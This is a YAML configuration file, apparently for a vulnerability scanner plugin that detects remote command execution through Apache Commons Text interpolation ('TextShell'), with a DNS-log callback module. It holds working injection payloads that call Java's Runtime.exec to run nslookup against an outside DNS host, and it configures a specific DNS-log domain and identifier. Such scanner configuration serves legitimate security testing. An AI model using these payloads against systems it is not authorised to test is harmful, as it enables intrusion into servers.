# 应用程序配置
application:
  # 远程命令扩展
  remoteCmdExtension:
    config:
      # 插件启动项
      isStart: true
      # 程序最大执行时间
      # 指的是请求里面每个参数的基础最大执行时间
      # 实际上会根据poc的增加而增加
      maxExecutionTime: 20
      # 提供商
      # 声明使用 Application.RemoteCmdExtension.ExtensionMethod 的哪个类,为该扩展提供服务
      provider: "RemoteCmdScan"
      # 漏洞名称
      issueName: "TextShell-RemoteCmd"
      payloads:
        - "%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27nslookup+dns-url%27%29%7D"
        - "${script:javascript:java.lang.Runtime.getRuntime().exec('nslookup dns-url')}"
# dnsLog模块
dnsLogModule:
  # 提供商
  # 声明使用 DnsLogModule.ExtensionMethod 的哪个类,为该扩展提供服务
  # 目前集成方法:
  # DnsLogCn = http://dnslog.cn的接口
  # BurpDnsLog = burp自带的dnslog接口
  # Ceye = http://ceye.io的接口
  # DnsLogPrivate = 自搭建的DNSLOG接口
  provider: "DnsLogPrivate"
  # 其它数据,用于一些需要验证接口取值使用的
  # 注意: key=value;为一个参数
  # 例如:
  # a=1; b=2; c=3;
  # Ceye的配置等于: token=xxx;Identifier=xxxx.ceye.io;
  # DnsLogPrivate的配置： DnsDomain=dns.ld; Identifier=http://dns/token
  other: "DnsDomain=5b7c4324.dns.1433.eu.org;Identifier=https://dig.pm/12qa8ygnz4jy;"